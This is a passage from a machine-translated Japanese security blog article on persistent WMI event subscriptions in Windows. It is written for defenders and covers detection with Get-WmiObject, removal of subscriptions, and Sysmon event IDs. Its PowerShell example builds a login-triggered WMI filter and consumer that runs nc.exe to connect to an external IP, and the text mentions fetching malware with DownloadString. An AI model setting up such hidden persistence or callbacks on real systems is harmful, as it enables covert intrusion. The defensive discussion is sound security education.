永続的なイベントの調査には時間がかかりますが、大規模なシステムに厳密な監視システムを実装する最も効果的な方法です。一時的なWMIイベントよりも多くの機能があります。また、DNSトンネリングや</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ゼロトラスト</font></a><font style="vertical-align: inherit;">ポリシー違反など、非標準の悪意のあるアクティビティについて警告するためにも使用できます</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
数日かけて永続的なイベントを調査したところ、PowerShellにはイベントフィルター、コンシューマー、およびフィルターとコンシューマーの間にWMIオブジェクトを作成するプロセスを簡略化する特別なコマンドレットがあることがわかりました。ご存じのとおり、PowerShellは管理者に作業を簡素化するための十分な機会を提供します。残念ながら、この例は、攻撃者がこれらの優れた機能を利用する方法を示しています。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
インサイダーは、ターゲットシステム上で一定のイベントを作成します。これにより、シェルセッションに存在する必要がなくなります。イベントは永久に、または明示的に削除されるまでそこに残ります。これを行う方法の詳細については、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">こちらをご覧ください。</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">しかし、全体的なプロセスは、一時的なイベントを使用して上記で行ったものと同様です。</font><font style="vertical-align: inherit;">ハッカーが最後に必要とするのは、イベントフィルターをイベントコンシューマーに関連付けることです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私が突然悪意のあるハッカーになることを決心した一般の従業員にとって、これはあまりにもクールに見えることに同意します。</font><font style="vertical-align: inherit;">興味を引くために、私はさまざまな</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">フォーラム</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を読み</font><font style="vertical-align: inherit;">、多くの人々がWMIの一定のイベントを機能させるために苦労して失敗しているのを見ました。</font><font style="vertical-align: inherit;">ただし、これは、Snowdenおよびダークサイドに切り替えることを決定した他の精通したシステム管理者の機能を超えません。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一定のイベント：IT管理者向けのヒント</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらの方法は、雇用主に復讐したい潜在的なハッカーや気分を害した従業員を訓練することを意図していません。</font><font style="vertical-align: inherit;">私がやりたいのは、ITプロフェッショナルがハッカーの考え方を理解して、侵入攻撃に対する適切な保護を実装できるようにすることです。</font><font style="vertical-align: inherit;">それらについて、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Set-WmiInstanceコマンドレット</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を使用してフィルターとコンシューマーオブジェクトを構成する方法を示します</font><font style="vertical-align: inherit;">。</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = “cruella”<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
宿題は、これら2つのコンポーネントをリンクするPowerShellコードを考え出すことです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私自身のテストの過程で、過度の労力と苦痛を伴うことなく、ターゲットシステムで動作する永続的なイベントを取得することができました。</font><font style="vertical-align: inherit;">覚えているように、PowerShellセッションと同じくらい続く一時的なWMIイベントでは、これを達成するのは非常に困難でした。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
たとえば、ユーザーのログインを監視するために永続的なWMIイベントを設定することで、内部システムやハッカーがターゲットシステムに留まる必要がなくなります。追加のボーナスは、永続的なWMIイベントが堅牢であることです。コンピューターが再起動しても、イベントトリガーは機能します。これにより、WMIの永続的なイベントは、攻撃をトリガーする強力で隠れた方法になり、監視だけでなく、それ以上のことを行うことができます。ご存じのように、WMIイベントは、セキュリティの専門家が攻撃の発信元を探す最初の場所からはほど遠いものです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
たとえば、イベントコンシューマーのPowerShellコードはランチャーとして機能し、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を使用してリモートサーバーに保存されているマルウェアをダウンロードできます</font><font style="vertical-align: inherit;">。素晴らしい</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">プレゼンテーション</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Black HatカンファレンスのMatt Graberには、永続的なWMIイベントの悪意のある可能性に関する多くの情報が含まれています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
セキュリティの専門家である場合、悪意のある使用の可能性に関してWMIイベントをどのように処理しますか？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
幸運を祈る：Get-WmiObjectコマンドレット（エイリアスgwmi）を使用して、イベントフィルター、コンシューマー、およびバインディングオブジェクトのリストを作成できます。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Get-WMIObjectを使用してWMI永続イベントを一覧表示し、適切なパラメーターを設定します。</font><font style="vertical-align: inherit;">タイムスタンプがないことに注意してください。</font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これで、永続的なイベントのフィルター（またはコンシューマー）が疑わしい場合、ITプロフェッショナルは、PowerShellパイプラインと</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI-RemoveObjectコマンドレット</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を使用してフィルターを削除することで、フィルターをオフにすることができます</font><font style="vertical-align: inherit;">。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 永続的なWMIイベントを削除するには、PowerShellパイプラインを使用する</font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
必要があります。ここでは、イベントが生成された時刻も悪意のあるユーザーの名前も指定されていません。</font><font style="vertical-align: inherit;">このフォレンジック情報を取得するには、Windowsイベントログを調べる必要があります。</font><font style="vertical-align: inherit;">これについては、以下で詳しく説明します。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">永続的なWMIイベントを無効にできますか？</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
少なくとも、ITプロフェッショナルは記録されたWMI永続イベントをすばやく確認し、脅威の兆候がないか実際のシナリオの分析を開始できます。おそらく、経験豊富なITセキュリティスペシャリストとして、誰もがラップトップでWMIを必要としているわけではなく、WMIの永続的なイベントの脆弱性に対処するための最良の戦略は、WMIを完全に無効にすることです。</font><font style="vertical-align: inherit;">WMIを開始</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
する</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サービスを無効にしてみてください</font><font style="vertical-align: inherit;">。実際には、これはそれほど単純ではありません。私自身のテストでは、このサービスを無効にすることができませんでした。自動的に何度も何度も起動しました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それでも無効にできたとしましょう。 Windows管理ソフトウェアはWMIに大きく依存しており、Winmgmtが利用できない場合は機能しません。インターネット上の</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">フォーラム</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIを無効にすることを警告するメッセージでいっぱい。</font><font style="vertical-align: inherit;">私はあなたのWMIに耳を傾け、慈悲をもっておくことを勧めます。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SysmonとSIEMを使用して脅威のWMIイベントを特定する</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
一般に、WMIイベントの脆弱性を事実として受け入れる必要があります。さいわい、前述のPowershellコマンドレットを使用するよりも、Windowsで永続的なイベントやその他の不審なイベント操作を検出するより効率的な方法があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
シスモンに会いましょう！私は、ダウンロードすることができ、この無料のWindowsユーティリティの詳細については、に行くことはありません</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここでは</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、この記事では。各Windowsイベントログを個別に表示するのではなく、分析に非常に役立つ情報を1か所で取得できると言えます。新しいWindowsシステムはより高度な標準のロギングメカニズムを使用するため、Windows 7以降のユーザーはSysmonを必要としない場合があります。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sysmonは、Microsoftの便利で直感的なイベントログツールです</font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。Sysmonは、永続的なWMIフィルターイベントの作成にイベント識別子19を割り当てます（20はWMIコンシューマーイベントの作成に割り当てられ、21はWMIバインディングに割り当てられます）。イベントビューアを開くと、Microsoft-&gt; Windows-&gt; SysmonセクションにSysmonイベントログが表示されます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ハッカーの活動の兆候である可能性がある永続的なWMIイベントを監視するために、手動でイベントビューアを開く必要はありません。私たちはあなたを助ける方法を知っています。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI永続イベントの作成（推測？）を監視するWMI永続イベントフィルターを作成しないのはなぜですか？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
オン</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">githubの</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">この操作を構成するコードを見つける小さなプロジェクトがあります。</font><font style="vertical-align: inherit;">これは、WMIイベントフィルターの作成を追跡できるWMIイベントフィルターのコードスニペットです。はい、WMIイベントフィルターです。</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
明らかに、証拠は雑誌の瓦礫に埋もれているため、ここでは情報セキュリティおよびセキュリティイベント管理（SIEM）ツールの助けが必要になります。</font><font style="vertical-align: inherit;">私はあなたがすべてがどこへ向かっているのか理解していると思います。</font><font style="vertical-align: inherit;">永続的なWMIイベントに関連する脅威を検出して排除するために、SIEM機能と他の脅威の分析を組み合わせ</font><font style="vertical-align: inherit;">た</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">セキュリティ監視ソリューション</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">が必要に</font><font style="vertical-align: inherit;">なります。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Instrumentationのよく寄せられる質問</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上記の方法は、ネットワークに監視システムを実装するために使用できますが、WMIについていくつか質問があるかもしれません。</font><font style="vertical-align: inherit;">このセクションでは、最も一般的なものに答えます。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIは非推奨ですか？</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI自体は古くはありませんが、WMICは廃止されており、多くの人々を混乱させています。</font><font style="vertical-align: inherit;">PowerShellを使用して、以前WMICで提供されていた機能にアクセスできるようになりました。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIはどのポートを使用しますか？ </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMIはTCPポート135といくつかの動的ポートを使用します：49152-65535（動的RPCポート：Windows Vista、2008以降）、TCP 1024-65535（動的RPCポート：Windows NT4、Windows 2000、Windows 2003）。</font><font style="vertical-align: inherit;">WMIのカスタムポート範囲を構成することもできます。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIはWimRMを使用しますか？ </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この構成は標準ではありませんが、WMIを使用して、WinRMスクリプトAPIを使用するスクリプトまたはアプリケーションを使用するか、Winrmコマンドラインツールを使用してデータを取得できます。</font><font style="vertical-align: inherit;">WinRMは、WMIを使用して、リソースデータを収集したり、Windowsオペレーティングシステムのリソースを管理したりできます。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">結論</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
見てきたように、WMIは管理者にリモートプロセスとコンピューターを監視するための強力なツールを提供し、疑わしいアクティビティを自動的に警告するエンドユーザー監視契約（EUMA）の開発に使用できます。</font><font style="vertical-align: inherit;">これは、内部の脅威を検出して排除し、セキュリティポリシーを回避する試みを防止し、システムの使用状況を監視するための優れたツールになります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMIを使用してインサイダーアクティビティを監視する方法の詳細については、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">こちらの</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">詳細ガイドをダウンロードできます</font><font style="vertical-align: inherit;">。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja507044/index.html">SoC'om MCUおよびFPGAを試すための最も手頃なボード</a></li>
<li><a href="../ja507048/index.html">Olya、テスト、ファクトリー-美しいアーキテクチャとクリーンなコードへの道</a></li>
<li><a href="../ja507050/index.html">中空騎士のゲームデザインの分析。パート1.忘れられた交差点</a></li>
<li><a href="../ja507052/index.html">最もクールなデータサイエンティストは統計に時間を無駄にしません</a></li>
<li><a href="../ja507066/index.html">Google広告の広告を自動化する10の方法</a></li>
<li><a href="../ja507074/index.html">SIMDチートシート、.NET Core用</a></li>
<li><a href="../ja507078/index.html">裁判所はメディアに他の誰かの記事を削除し、メインのYandexに異議を唱えることを命じました</a></li>
<li><a href="../ja507080/index.html">オールカップ：優れたエコシステムデザインのストーリー</a></li>
<li><a href="../ja507084/index.html">SpatialChatパーティーはパンデミックの間に人気を博しました-そして彼らは入り江の後で終わることはほとんどありません</a></li>
<li><a href="../ja507086/index.html">USBモデムHUAWEI E3372経由でSMSを送信するには、BashスクリプトをC＃コードに変換します</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>